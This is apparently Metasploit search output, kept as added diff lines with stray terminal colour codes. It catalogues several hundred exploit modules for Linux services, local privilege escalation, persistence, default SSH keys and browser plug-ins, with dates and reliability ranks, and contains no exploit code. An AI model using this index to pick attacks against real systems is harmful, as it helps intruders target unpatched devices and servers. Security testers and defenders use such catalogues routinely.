+   200  exploit/[45mlinux[0m/http/sophos_wpa_sblistpack_exec                             2013-09-06       [32mexcellent[0m  Yes    Sophos Web Protection Appliance sblistpack Arbitrary Command Execution
+   201  exploit/[45mlinux[0m/http/spark_unauth_rce                                       2017-12-12       [32mexcellent[0m  Yes    Apache Spark Unauthenticated Command Execution
+   202  exploit/[45mlinux[0m/http/supervisor_xmlrpc_exec                                 2017-07-19       [32mexcellent[0m  Yes    Supervisor XML-RPC Authenticated Remote Code Execution
+   203  exploit/[45mlinux[0m/http/symantec_messaging_gateway_exec                        2017-04-26       [32mexcellent[0m  No     Symantec Messaging Gateway Remote Code Execution
+   204  exploit/[45mlinux[0m/http/symantec_web_gateway_exec                              2012-05-17       [32mexcellent[0m  Yes    Symantec Web Gateway 5.0.2.8 ipchange.php Command Injection
+   205  exploit/[45mlinux[0m/http/symantec_web_gateway_file_upload                       2012-05-17       [32mexcellent[0m  Yes    Symantec Web Gateway 5.0.2.8 Arbitrary PHP File Upload Vulnerability
+   206  exploit/[45mlinux[0m/http/symantec_web_gateway_lfi                               2012-05-17       [32mexcellent[0m  Yes    Symantec Web Gateway 5.0.2.8 relfile File Inclusion Vulnerability
+   207  exploit/[45mlinux[0m/http/symantec_web_gateway_pbcontrol                         2012-07-23       [32mexcellent[0m  Yes    Symantec Web Gateway 5.0.2.18 pbcontrol.php Command Injection
+   208  exploit/[45mlinux[0m/http/symantec_web_gateway_restore                           2014-12-16       [32mexcellent[0m  Yes    Symantec Web Gateway 5 restore.php Post Authentication Command Injection
+   209  exploit/[45mlinux[0m/http/synology_dsm_sliceupload_exec_noauth                   2013-10-31       [32mexcellent[0m  Yes    Synology DiskStation Manager SLICEUPLOAD Remote Command Execution
+   210  exploit/[45mlinux[0m/http/synology_dsm_smart_exec_auth                           2017-11-08       [32mexcellent[0m  Yes    Synology DiskStation Manager smart.cgi Remote Command Execution
+   211  exploit/[45mlinux[0m/http/tiki_calendar_exec                                     2016-06-06       [32mexcellent[0m  Yes    Tiki-Wiki CMS Calendar Command Execution
+   212  exploit/[45mlinux[0m/http/tp_link_sc2020n_authenticated_telnet_injection         2015-12-20       [32mexcellent[0m  No     TP-Link SC2020n Authenticated Telnet Injection
+   213  exploit/[45mlinux[0m/http/tr064_ntpserver_cmdinject                              2016-11-07       normal     Yes    Zyxel/Eir D1000 DSL Modem NewNTPServer Command Injection Over TR-064
+   214  exploit/[45mlinux[0m/http/trend_micro_imsva_exec                                 2017-01-15       [32mexcellent[0m  No     Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution
+   215  exploit/[45mlinux[0m/http/trendmicro_imsva_widget_exec                           2017-10-07       [32mexcellent[0m  Yes    Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution
+   216  exploit/[45mlinux[0m/http/trendmicro_sps_exec                                    2016-08-08       [32mexcellent[0m  Yes    Trend Micro Smart Protection Server Exec Remote Code Injection
+   217  exploit/[45mlinux[0m/http/trendmicro_websecurity_exec                            2020-06-10       [32mexcellent[0m  Yes    Trend Micro Web Security (Virtual Appliance) Remote Code Execution
+   218  exploit/[45mlinux[0m/http/trueonline_billion_5200w_rce                           2016-12-26       [32mexcellent[0m  No     TrueOnline / Billion 5200W-T Router Unauthenticated Command Injection
+   219  exploit/[45mlinux[0m/http/trueonline_p660hn_v1_rce                               2016-12-26       [32mexcellent[0m  Yes    TrueOnline / ZyXEL P660HN-T v1 Router Unauthenticated Command Injection
+   220  exploit/[45mlinux[0m/http/trueonline_p660hn_v2_rce                               2016-12-26       [32mexcellent[0m  Yes    TrueOnline / ZyXEL P660HN-T v2 Router Authenticated Command Injection
+   221  exploit/[45mlinux[0m/http/ubiquiti_airos_file_upload                             2016-02-13       [32mexcellent[0m  No     Ubiquiti airOS Arbitrary File Upload
+   222  exploit/[45mlinux[0m/http/ueb_api_rce                                            2017-08-08       [32mexcellent[0m  Yes    Unitrends UEB http api remote code execution
+   223  exploit/[45mlinux[0m/http/unraid_auth_bypass_exec                                2020-02-10       [32mexcellent[0m  Yes    Unraid 6.8.0 Auth Bypass PHP Code Execution
+   224  exploit/[45mlinux[0m/http/vap2500_tools_command_exec                             2014-11-25       normal     Yes    Arris VAP2500 tools_command.php Command Execution
+   225  exploit/[45mlinux[0m/http/vcms_upload                                            2011-11-27       [32mexcellent[0m  Yes    V-CMS PHP File Upload and Execute
+   226  exploit/[45mlinux[0m/http/vestacp_exec                                           2020-03-17       [32mexcellent[0m  No     Vesta Control Panel Authenticated Remote Code Execution
+   227  exploit/[45mlinux[0m/http/wanem_exec                                             2012-08-12       [32mexcellent[0m  Yes    WAN Emulator v2.3 Command Execution
+   228  exploit/[45mlinux[0m/http/wd_mycloud_multiupload_upload                          2017-07-29       [32mexcellent[0m  Yes    Western Digital MyCloud multi_uploadify File Upload Vulnerability
+   229  exploit/[45mlinux[0m/http/webcalendar_settings_exec                              2012-04-23       [32mexcellent[0m  Yes    WebCalendar 1.2.4 Pre-Auth Remote Code Injection
+   230  exploit/[45mlinux[0m/http/webid_converter                                        2011-07-05       [32mexcellent[0m  Yes    WeBid converter.php Remote PHP Code Injection
+   231  exploit/[45mlinux[0m/http/webmin_backdoor                                        2019-08-10       [32mexcellent[0m  Yes    Webmin password_change.cgi Backdoor
+   232  exploit/[45mlinux[0m/http/webmin_packageup_rce                                   2019-05-16       [32mexcellent[0m  Yes    Webmin Package Updates Remote Command Execution
+   233  exploit/[45mlinux[0m/http/wepresent_cmd_injection                                2019-04-30       [32mexcellent[0m  Yes    Barco WePresent file_transfer.cgi Command Injection
+   234  exploit/[45mlinux[0m/http/wipg1000_cmd_injection                                 2017-04-20       [32mexcellent[0m  Yes    WePresent WiPG-1000 Command Injection
+   235  exploit/[45mlinux[0m/http/xplico_exec                                            2017-10-29       [32mexcellent[0m  Yes    Xplico Remote Code Execution
+   236  exploit/[45mlinux[0m/http/zabbix_sqli                                            2013-09-23       [32mexcellent[0m  Yes    Zabbix 2.0.8 SQL Injection and Remote Code Execution
+   237  exploit/[45mlinux[0m/http/zen_load_balancer_exec                                 2012-09-14       [32mexcellent[0m  Yes    ZEN Load Balancer Filelog Command Execution
+   238  exploit/[45mlinux[0m/http/zenoss_showdaemonxmlconfig_exec                        2012-07-30       good       Yes    Zenoss 3 showDaemonXMLConfig Command Execution
+   239  exploit/[45mlinux[0m/http/zimbra_xxe_rce                                         2019-03-13       [32mexcellent[0m  Yes    Zimbra Collaboration Autodiscover Servlet XXE and ProxyServlet SSRF
+   240  exploit/[45mlinux[0m/ids/alienvault_centerd_soap_exec                            2014-05-05       [32mexcellent[0m  Yes    AlienVault OSSIM av-centerd Command Injection
+   241  exploit/[45mlinux[0m/ids/snortbopre                                              2005-10-18       good       No     Snort Back Orifice Pre-Preprocessor Buffer Overflow
+   242  exploit/[45mlinux[0m/imap/imap_uw_lsub                                           2000-04-16       good       Yes    UoW IMAP Server LSUB Buffer Overflow
+   243  exploit/[45mlinux[0m/local/abrt_raceabrt_priv_esc                                2015-04-14       [32mexcellent[0m  Yes    ABRT raceabrt Privilege Escalation
+   244  exploit/[45mlinux[0m/local/abrt_sosreport_priv_esc                               2015-11-23       [32mexcellent[0m  Yes    ABRT sosreport Privilege Escalation
+   245  exploit/[45mlinux[0m/local/af_packet_chocobo_root_priv_esc                       2016-08-12       good       Yes    AF_PACKET chocobo_root Privilege Escalation
+   246  exploit/[45mlinux[0m/local/af_packet_packet_set_ring_priv_esc                    2017-03-29       good       Yes    AF_PACKET packet_set_ring Privilege Escalation
+   247  exploit/[45mlinux[0m/local/apport_abrt_chroot_priv_esc                           2015-03-31       [32mexcellent[0m  Yes    Apport / ABRT chroot Privilege Escalation
+   248  exploit/[45mlinux[0m/local/apt_package_manager_persistence                       1999-03-09       [32mexcellent[0m  No     APT Package Manager Persistence
+   249  exploit/[45mlinux[0m/local/asan_suid_executable_priv_esc                         2016-02-17       [32mexcellent[0m  Yes    AddressSanitizer (ASan) SUID Executable Privilege Escalation
+   250  exploit/[45mlinux[0m/local/autostart_persistence                                 2006-02-13       [32mexcellent[0m  No     Autostart Desktop Item Persistence
+   251  exploit/[45mlinux[0m/local/bash_profile_persistence                              1989-06-08       normal     No     Bash Profile Persistence
+   252  exploit/[45mlinux[0m/local/blueman_set_dhcp_handler_dbus_priv_esc                2015-12-18       [32mexcellent[0m  Yes    blueman set_dhcp_handler D-Bus Privilege Escalation
+   253  exploit/[45mlinux[0m/local/bpf_priv_esc                                          2016-05-04       good       Yes    [45mLinux[0m BPF doubleput UAF Privilege Escalation
+   254  exploit/[45mlinux[0m/local/bpf_sign_extension_priv_esc                           2017-11-12       [32mgreat[0m      Yes    [45mLinux[0m BPF Sign Extension Local Privilege Escalation
+   255  exploit/[45mlinux[0m/local/cpi_runrshell_priv_esc                                2018-12-08       [32mexcellent[0m  No     Cisco Prime Infrastructure Runrshell Privilege Escalation
+   256  exploit/[45mlinux[0m/local/cron_persistence                                      1979-07-01       [32mexcellent[0m  No     Cron Persistence
+   257  exploit/[45mlinux[0m/local/desktop_privilege_escalation                          2014-08-07       [32mexcellent[0m  Yes    Desktop [45mLinux[0m Password Stealer and Privilege Escalation
+   258  exploit/[45mlinux[0m/local/diamorphine_rootkit_signal_priv_esc                   2013-11-07       [32mexcellent[0m  Yes    Diamorphine Rootkit Signal Privilege Escalation
+   259  exploit/[45mlinux[0m/local/docker_daemon_privilege_escalation                    2016-06-28       [32mexcellent[0m  Yes    Docker Daemon Privilege Escalation
+   260  exploit/[45mlinux[0m/local/exim4_deliver_message_priv_esc                        2019-06-05       [32mexcellent[0m  Yes    Exim 4.87 - 4.91 Local Privilege Escalation
+   261  exploit/[45mlinux[0m/local/glibc_ld_audit_dso_load_priv_esc                      2010-10-18       [32mexcellent[0m  Yes    glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation
+   262  exploit/[45mlinux[0m/local/glibc_origin_expansion_priv_esc                       2010-10-18       [32mexcellent[0m  Yes    glibc '$ORIGIN' Expansion Privilege Escalation
+   263  exploit/[45mlinux[0m/local/glibc_realpath_priv_esc                               2018-01-16       normal     Yes    glibc 'realpath()' Privilege Escalation
+   264  exploit/[45mlinux[0m/local/hp_smhstart                                           2013-03-30       normal     No     HP System Management Homepage Local Privilege Escalation
+   265  exploit/[45mlinux[0m/local/hp_xglance_priv_esc                                   2014-11-19       [32mgreat[0m      Yes    HP Performance Monitoring xglance Priv Esc
+   266  exploit/[45mlinux[0m/local/juju_run_agent_priv_esc                               2017-04-13       [32mexcellent[0m  Yes    Juju-run Agent Privilege Escalation
+   267  exploit/[45mlinux[0m/local/kloxo_lxsuexec                                        2012-09-18       [32mexcellent[0m  No     Kloxo Local Privilege Escalation
+   268  exploit/[45mlinux[0m/local/ktsuss_suid_priv_esc                                  2011-08-13       [32mexcellent[0m  Yes    ktsuss suid Privilege Escalation
+   269  exploit/[45mlinux[0m/local/lastore_daemon_dbus_priv_esc                          2016-02-02       [32mexcellent[0m  Yes    lastore-daemon D-Bus Privilege Escalation
+   270  exploit/[45mlinux[0m/local/libuser_roothelper_priv_esc                           2015-07-24       [32mgreat[0m      Yes    Libuser roothelper Privilege Escalation
+   271  exploit/[45mlinux[0m/local/nested_namespace_idmap_limit_priv_esc                 2018-11-15       [32mgreat[0m      Yes    [45mLinux[0m Nested User Namespace idmap Limit Local Privilege Escalation
+   272  exploit/[45mlinux[0m/local/netfilter_priv_esc_ipv4                               2016-06-03       good       Yes    [45mLinux[0m [45mKernel[0m 4.6.3 Netfilter Privilege Escalation
+   273  exploit/[45mlinux[0m/local/network_manager_vpnc_username_priv_esc                2018-07-26       [32mexcellent[0m  Yes    Network Manager VPNC Username Privilege Escalation
+   274  exploit/[45mlinux[0m/local/ntfs3g_priv_esc                                       2017-01-05       good       Yes    Debian/Ubuntu ntfs-3g Local Privilege Escalation
+   275  exploit/[45mlinux[0m/local/omniresolve_suid_priv_esc                             2019-09-13       [32mexcellent[0m  Yes    Micro Focus (HPE) Data Protector SUID Privilege Escalation
+   276  exploit/[45mlinux[0m/local/overlayfs_priv_esc                                    2015-06-16       good       Yes    Overlayfs Privilege Escalation
+   277  exploit/[45mlinux[0m/local/pkexec                                                2011-04-01       [32mgreat[0m      Yes    [45mLinux[0m PolicyKit Race Condition Privilege Escalation
+   278  exploit/[45mlinux[0m/local/ptrace_sudo_token_priv_esc                            2019-03-24       [32mexcellent[0m  Yes    ptrace Sudo Token Privilege Escalation
+   279  exploit/[45mlinux[0m/local/ptrace_traceme_pkexec_helper                          2019-07-04       [32mexcellent[0m  Yes    [45mLinux[0m Polkit pkexec helper PTRACE_TRACEME local root exploit
+   280  exploit/[45mlinux[0m/local/rc_local_persistence                                  1980-10-01       [32mexcellent[0m  No     rc.local Persistence
+   281  exploit/[45mlinux[0m/local/rds_atomic_free_op_null_pointer_deref_priv_esc        2018-11-01       good       Yes    Reliable Datagram Sockets (RDS) rds_atomic_free_op NULL pointer dereference Privilege Escalation
+   282  exploit/[45mlinux[0m/local/rds_rds_page_copy_user_priv_esc                       2010-10-20       [32mgreat[0m      Yes    Reliable Datagram Sockets (RDS) rds_page_copy_user Privilege Escalation
+   283  exploit/[45mlinux[0m/local/recvmmsg_priv_esc                                     2014-02-02       good       Yes    [45mLinux[0m [45mKernel[0m recvmmsg Privilege Escalation
+   284  exploit/[45mlinux[0m/local/reptile_rootkit_reptile_cmd_priv_esc                  2018-10-29       [32mexcellent[0m  Yes    Reptile Rootkit reptile_cmd Privilege Escalation
+   285  exploit/[45mlinux[0m/local/service_persistence                                   1983-01-01       [32mexcellent[0m  No     Service Persistence
+   286  exploit/[45mlinux[0m/local/servu_ftp_server_prepareinstallation_priv_esc         2019-06-05       [32mexcellent[0m  Yes    Serv-U FTP Server prepareinstallation Privilege Escalation
+   287  exploit/[45mlinux[0m/local/sock_sendpage                                         2009-08-13       [32mgreat[0m      Yes    [45mLinux[0m [45mKernel[0m Sendpage Local Privilege Escalation
+   288  exploit/[45mlinux[0m/local/sophos_wpa_clear_keys                                 2013-09-06       [32mexcellent[0m  Yes    Sophos Web Protection Appliance clear_keys.pl Local Privilege Escalation
+   289  exploit/[45mlinux[0m/local/systemtap_modprobe_options_priv_esc                   2010-11-17       [32mexcellent[0m  Yes    SystemTap MODPROBE_OPTIONS Privilege Escalation
+   290  exploit/[45mlinux[0m/local/udev_netlink                                          2009-04-16       [32mgreat[0m      No     [45mLinux[0m udev Netlink Local Privilege Escalation
+   291  exploit/[45mlinux[0m/local/ueb_bpserverd_privesc                                 2018-03-14       [32mexcellent[0m  No     Unitrends Enterprise Backup bpserverd Privilege Escalation
+   292  exploit/[45mlinux[0m/local/ufo_privilege_escalation                              2017-08-10       good       Yes    [45mLinux[0m [45mKernel[0m UDP Fragmentation Offset (UFO) Privilege Escalation
+   293  exploit/[45mlinux[0m/local/vmware_alsa_config                                    2017-05-22       [32mexcellent[0m  Yes    VMware Workstation ALSA Config File Local Privilege Escalation
+   294  exploit/[45mlinux[0m/local/vmware_mount                                          2013-08-22       [32mexcellent[0m  Yes    VMWare Setuid vmware-mount Unsafe popen(3)
+   295  exploit/[45mlinux[0m/local/yum_package_manager_persistence                       2003-12-17       [32mexcellent[0m  No     Yum Package Manager Persistence
+   296  exploit/[45mlinux[0m/local/zpanel_zsudo                                          2013-06-07       [32mexcellent[0m  Yes    ZPanel zsudo Local Privilege Escalation Exploit
+   297  exploit/[45mlinux[0m/misc/accellion_fta_mpipe2                                   2011-02-07       [32mexcellent[0m  No     Accellion FTA MPIPE2 Command Execution
+   298  exploit/[45mlinux[0m/misc/asus_infosvr_auth_bypass_exec                          2015-01-04       [32mexcellent[0m  No     ASUS infosvr Auth Bypass Command Execution
+   299  exploit/[45mlinux[0m/misc/cve_2020_13160_anydesk                                 2020-06-16       normal     Yes    AnyDesk GUI Format String Write
+   300  exploit/[45mlinux[0m/misc/drb_remote_codeexec                                    2011-03-23       [32mexcellent[0m  No     Distributed Ruby Remote Code Execution
+   301  exploit/[45mlinux[0m/misc/gld_postfix                                            2005-04-12       good       No     GLD (Greylisting Daemon) Postfix Buffer Overflow
+   302  exploit/[45mlinux[0m/misc/hid_discoveryd_command_blink_on_unauth_rce             2016-03-28       [32mexcellent[0m  Yes    HID discoveryd command_blink_on Unauthenticated RCE
+   303  exploit/[45mlinux[0m/misc/hikvision_rtsp_bof                                     2014-11-19       normal     No     Hikvision DVR RTSP Request Remote Code Execution
+   304  exploit/[45mlinux[0m/misc/hp_data_protector_cmd_exec                             2011-02-07       [32mexcellent[0m  No     HP Data Protector 6 EXEC_CMD Remote Code Execution
+   305  exploit/[45mlinux[0m/misc/hp_jetdirect_path_traversal                            2017-04-05       normal     No     HP Jetdirect Path Traversal Arbitrary Code Execution
+   306  exploit/[45mlinux[0m/misc/hp_nnmi_pmd_bof                                        2014-09-09       normal     Yes    HP Network Node Manager I PMD Buffer Overflow
+   307  exploit/[45mlinux[0m/misc/hp_vsa_login_bof                                       2013-06-28       normal     Yes    HP StorageWorks P4000 Virtual SAN Appliance Login Buffer Overflow
+   308  exploit/[45mlinux[0m/misc/hplip_hpssd_exec                                       2007-10-04       [32mexcellent[0m  No     HPLIP hpssd.py From Address Arbitrary Command Execution
+   309  exploit/[45mlinux[0m/misc/ib_inet_connect                                        2007-10-03       good       No     Borland InterBase INET_connect() Buffer Overflow
+   310  exploit/[45mlinux[0m/misc/ib_jrd8_create_database                                2007-10-03       good       No     Borland InterBase jrd8_create_database() Buffer Overflow
+   311  exploit/[45mlinux[0m/misc/ib_open_marker_file                                    2007-10-03       good       No     Borland InterBase open_marker_file() Buffer Overflow
+   312  exploit/[45mlinux[0m/misc/ib_pwd_db_aliased                                      2007-10-03       good       No     Borland InterBase PWD_db_aliased() Buffer Overflow
+   313  exploit/[45mlinux[0m/misc/jenkins_java_deserialize                               2015-11-18       [32mexcellent[0m  Yes    Jenkins CLI RMI Java Deserialization Vulnerability
+   314  exploit/[45mlinux[0m/misc/jenkins_ldap_deserialize                               2016-11-16       [32mexcellent[0m  Yes    Jenkins CLI HTTP Java Deserialization Vulnerability
+   315  exploit/[45mlinux[0m/misc/lprng_format_string                                    2000-09-25       normal     No     LPRng use_syslog Remote Format String Vulnerability
+   316  exploit/[45mlinux[0m/misc/mongod_native_helper                                   2013-03-24       normal     No     MongoDB nativeHelper.apply Remote Code Execution
+   317  exploit/[45mlinux[0m/misc/nagios_nrpe_arguments                                  2013-02-21       [32mexcellent[0m  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
+   318  exploit/[45mlinux[0m/misc/netcore_udp_53413_backdoor                             2014-08-25       normal     Yes    Netcore Router Udp 53413 Backdoor
+   319  exploit/[45mlinux[0m/misc/netsupport_manager_agent                               2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
+   320  exploit/[45mlinux[0m/misc/novell_edirectory_ncp_bof                              2012-12-12       normal     Yes    Novell eDirectory 8 Buffer Overflow
+   321  exploit/[45mlinux[0m/misc/opennms_java_serialize                                 2015-11-06       normal     No     OpenNMS Java Object Unserialization Remote Code Execution
+   322  exploit/[45mlinux[0m/misc/qnap_transcode_server                                  2017-08-06       [32mexcellent[0m  Yes    QNAP Transcode Server Command Execution
+   323  exploit/[45mlinux[0m/misc/quest_pmmasterd_bof                                    2017-04-09       normal     Yes    Quest Privilege Manager pmmasterd Buffer Overflow
+   324  exploit/[45mlinux[0m/misc/saltstack_salt_unauth_rce                              2020-04-30       [32mgreat[0m      Yes    SaltStack Salt Master/Minion Unauthenticated RCE
+   325  exploit/[45mlinux[0m/misc/sercomm_exec                                           2013-12-31       [32mgreat[0m      Yes    SerComm Device Remote Code Execution
+   326  exploit/[45mlinux[0m/misc/tplink_archer_a7_c7_lan_rce                            2020-03-25       [32mexcellent[0m  Yes    TP-Link Archer A7/C7 Unauthenticated LAN Remote Code Execution
+   327  exploit/[45mlinux[0m/misc/ueb9_bpserverd                                         2017-08-08       [32mexcellent[0m  Yes    Unitrends UEB bpserverd authentication bypass RCE
+   328  exploit/[45mlinux[0m/misc/zabbix_server_exec                                     2009-09-10       [32mexcellent[0m  Yes    Zabbix Server Arbitrary Command Execution
+   329  exploit/[45mlinux[0m/mysql/mysql_yassl_getname                                   2010-01-25       good       No     MySQL yaSSL CertDecoder::GetName Buffer Overflow
+   330  exploit/[45mlinux[0m/mysql/mysql_yassl_hello                                     2008-01-04       good       No     MySQL yaSSL SSL Hello Message Buffer Overflow
+   331  exploit/[45mlinux[0m/pop3/cyrus_pop3d_popsubfolders                              2006-05-21       normal     No     Cyrus IMAPD pop3d popsubfolders USER Buffer Overflow
+   332  exploit/[45mlinux[0m/postgres/postgres_payload                                   2007-06-05       [32mexcellent[0m  Yes    PostgreSQL for [45mLinux[0m Payload Execution
+   333  exploit/[45mlinux[0m/pptp/poptop_negative_read                                   2003-04-09       [32mgreat[0m      Yes    Poptop Negative Read Overflow
+   334  exploit/[45mlinux[0m/proxy/squid_ntlm_authenticate                               2004-06-08       [32mgreat[0m      No     Squid NTLM Authenticate Overflow
+   335  exploit/[45mlinux[0m/redis/redis_replication_cmd_exec                            2018-11-13       good       Yes    Redis Replication Code Execution
+   336  exploit/[45mlinux[0m/samba/chain_reply                                           2010-06-16       good       No     Samba chain_reply Memory Corruption ([45mLinux[0m x86)
+   337  exploit/[45mlinux[0m/samba/is_known_pipename                                     2017-03-24       [32mexcellent[0m  Yes    Samba is_known_pipename() Arbitrary Module Load
+   338  exploit/[45mlinux[0m/samba/lsa_transnames_heap                                   2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   339  exploit/[45mlinux[0m/samba/setinfopolicy_heap                                    2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   340  exploit/[45mlinux[0m/samba/trans2open                                            2003-04-07       [32mgreat[0m      No     Samba trans2open Overflow ([45mLinux[0m x86)
+   341  exploit/[45mlinux[0m/smtp/apache_james_exec                                      2015-10-01       normal     Yes    Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write
+   342  exploit/[45mlinux[0m/smtp/exim4_dovecot_exec                                     2013-05-03       [32mexcellent[0m  No     Exim and Dovecot Insecure Configuration Command Injection
+   343  exploit/[45mlinux[0m/smtp/exim_gethostbyname_bof                                 2015-01-27       [32mgreat[0m      Yes    Exim GHOST (glibc gethostbyname) Buffer Overflow
+   344  exploit/[45mlinux[0m/smtp/haraka                                                 2017-01-26       [32mexcellent[0m  Yes    Haraka SMTP Command Injection
+   345  exploit/[45mlinux[0m/snmp/awind_snmp_exec                                        2019-03-27       [32mexcellent[0m  Yes    AwindInc SNMP Service Command Injection
+   346  exploit/[45mlinux[0m/snmp/net_snmpd_rw_access                                    2004-05-10       normal     No     Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution
+   347  exploit/[45mlinux[0m/ssh/ceragon_fibeair_known_privkey                           2015-04-01       [32mexcellent[0m  No     Ceragon FibeAir IP-10 SSH Private Key Exposure
+   348  exploit/[45mlinux[0m/ssh/cisco_ucs_scpuser                                       2019-08-21       [32mexcellent[0m  No     Cisco UCS Director default scpuser password
+   349  exploit/[45mlinux[0m/ssh/exagrid_known_privkey                                   2016-04-07       [32mexcellent[0m  No     ExaGrid Known SSH Key and Default Password
+   350  exploit/[45mlinux[0m/ssh/f5_bigip_known_privkey                                  2012-06-11       [32mexcellent[0m  No     F5 BIG-IP SSH Private Key Exposure
+   351  exploit/[45mlinux[0m/ssh/ibm_drm_a3user                                          2020-04-21       [32mexcellent[0m  No     IBM Data Risk Manager a3user Default Password
+   352  exploit/[45mlinux[0m/ssh/loadbalancerorg_enterprise_known_privkey                2014-03-17       [32mexcellent[0m  No     Loadbalancer.org Enterprise VA SSH Private Key Exposure
+   353  exploit/[45mlinux[0m/ssh/mercurial_ssh_exec                                      2017-04-18       [32mexcellent[0m  No     Mercurial Custom hg-ssh Wrapper Remote Code Exec
+   354  exploit/[45mlinux[0m/ssh/quantum_dxi_known_privkey                               2014-03-17       [32mexcellent[0m  No     Quantum DXi V1000 SSH Private Key Exposure
+   355  exploit/[45mlinux[0m/ssh/quantum_vmpro_backdoor                                  2014-03-17       [32mexcellent[0m  No     Quantum vmPRO Backdoor Command
+   356  exploit/[45mlinux[0m/ssh/solarwinds_lem_exec                                     2017-03-17       [32mexcellent[0m  No     SolarWinds LEM Default SSH Password Remote Code Execution
+   357  exploit/[45mlinux[0m/ssh/symantec_smg_ssh                                        2012-08-27       [32mexcellent[0m  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
+   358  exploit/[45mlinux[0m/ssh/vmware_vdp_known_privkey                                2016-12-20       [32mexcellent[0m  No     VMware VDP Known SSH Key
+   359  exploit/[45mlinux[0m/telnet/netgear_telnetenable                                 2009-10-30       [32mexcellent[0m  Yes    NETGEAR TelnetEnable
+   360  exploit/[45mlinux[0m/telnet/telnet_encrypt_keyid                                 2011-12-23       [32mgreat[0m      No     [45mLinux[0m BSD-derived Telnet Service Encryption Key ID Buffer Overflow
+   361  exploit/[45mlinux[0m/upnp/belkin_wemo_upnp_exec                                  2014-04-04       [32mexcellent[0m  Yes    Belkin Wemo UPnP Remote Code Execution
+   362  exploit/[45mlinux[0m/upnp/dlink_dir859_exec_ssdpcgi                              2019-12-24       [32mexcellent[0m  No     D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi
+   363  exploit/[45mlinux[0m/upnp/dlink_dir859_subscribe_exec                            2019-12-24       [32mexcellent[0m  No     D-Link DIR-859 Unauthenticated Remote Command Execution
+   364  exploit/[45mlinux[0m/upnp/dlink_upnp_msearch_exec                                2013-02-01       [32mexcellent[0m  Yes    D-Link Unauthenticated UPnP M-SEARCH Multicast Command Injection
+   365  exploit/[45mlinux[0m/upnp/miniupnpd_soap_bof                                     2013-03-27       normal     Yes    MiniUPnPd 1.0 Stack Buffer Overflow Remote Code Execution
+   366  exploit/multi/browser/adobe_flash_hacking_team_uaf                        2015-07-06       [32mgreat[0m      No     Adobe Flash Player ByteArray Use After Free
+   367  exploit/multi/browser/adobe_flash_nellymoser_bof                          2015-06-23       [32mgreat[0m      No     Adobe Flash Player Nellymoser Audio Decoding Buffer Overflow
+   368  exploit/multi/browser/adobe_flash_net_connection_confusion                2015-03-12       [32mgreat[0m      No     Adobe Flash Player NetConnection Type Confusion
+   369  exploit/multi/browser/adobe_flash_pixel_bender_bof                        2014-04-28       [32mgreat[0m      No     Adobe Flash Player Shader Buffer Overflow
+   370  exploit/multi/browser/adobe_flash_shader_drawing_fill                     2015-05-12       [32mgreat[0m      No     Adobe Flash Player Drawing Fill Shader Memory Corruption
+   371  exploit/multi/browser/adobe_flash_shader_job_overflow                     2015-05-12       [32mgreat[0m      No     Adobe Flash Player ShaderJob Buffer Overflow
+   372  exploit/multi/browser/adobe_flash_uncompress_zlib_uaf                     2014-04-28       [32mgreat[0m      No     Adobe Flash Player ByteArray UncompressViaZlibVariant Use After Free
+   373  exploit/multi/browser/firefox_queryinterface                              2006-02-02       normal     No     Firefox location.QueryInterface() Code Execution
+   374  exploit/multi/browser/java_atomicreferencearray                           2012-02-14       [32mexcellent[0m  No     Java AtomicReferenceArray Type Violation Vulnerability
+   375  exploit/multi/browser/java_calendar_deserialize                           2008-12-03       [32mexcellent[0m  No     Sun Java Calendar Deserialization Privilege Escalation
+   376  exploit/multi/browser/java_jre17_driver_manager                           2013-01-10       [32mexcellent[0m  No     Java Applet Driver Manager Privileged toString() Remote Code Execution
+   377  exploit/multi/browser/java_jre17_exec                                     2012-08-26       [32mexcellent[0m  No     Java 7 Applet Remote Code Execution
+   378  exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl      2012-10-16       [32mexcellent[0m  No     Java Applet AverageRangeStatisticImpl Remote Code Execution
+   379  exploit/multi/browser/java_jre17_jaxws                                    2012-10-16       [32mexcellent[0m  No     Java Applet JAX-WS Remote Code Execution
+   380  exploit/multi/browser/java_jre17_jmxbean                                  2013-01-10       [32mexcellent[0m  No     Java Applet JMX Remote Code Execution
+   381  exploit/multi/browser/java_jre17_jmxbean_2                                2013-01-19       [32mexcellent[0m  No     Java Applet JMX Remote Code Execution
+   382  exploit/multi/browser/java_jre17_method_handle                            2012-10-16       [32mexcellent[0m  No     Java Applet Method Handle Remote Code Execution
+   383  exploit/multi/browser/java_jre17_provider_skeleton                        2013-06-18       [32mgreat[0m      No     Java Applet ProviderSkeleton Insecure Invoke Method
+   384  exploit/multi/browser/java_jre17_reflection_types                         2013-01-10       [32mexcellent[0m  No     Java Applet Reflection Type Confusion Remote Code Execution
+   385  exploit/multi/browser/java_rhino                                          2011-10-18       [32mexcellent[0m  No     Java Applet Rhino Script Engine Remote Code Execution
+   386  exploit/multi/browser/java_signed_applet                                  1997-02-19       [32mexcellent[0m  No     Java Signed Applet Social Engineering Code Execution
+   387  exploit/multi/browser/java_storeimagearray                                2013-08-12       [32mgreat[0m      No     Java storeImageArray() Invalid Array Indexing Vulnerability
+   388  exploit/multi/browser/java_trusted_chain                                  2010-03-31       [32mexcellent[0m  No     Java Statement.invoke() Trusted Method Chain Privilege Escalation
+   389  exploit/multi/browser/java_verifier_field_access                          2012-06-06       [32mexcellent[0m  No     Java Applet Field Bytecode Verifier Cache Remote Code Execution
+   390  exploit/multi/browser/mozilla_navigatorjava                               2006-07-25       normal     No     Mozilla Suite/Firefox Navigator Object Code Execution
+   391  exploit/multi/fileformat/adobe_u3d_meshcont                               2009-10-13       good       No     Adobe U3D CLODProgressiveMeshDeclaration Array Overrun
+   392  exploit/multi/fileformat/ghostscript_failed_restore                       2018-08-21       [32mexcellent[0m  No     Ghostscript Failed Restore Command Execution
+   393  exploit/multi/fileformat/libreoffice_macro_exec                           2018-10-18       normal     No     LibreOffice Macro Code Execution
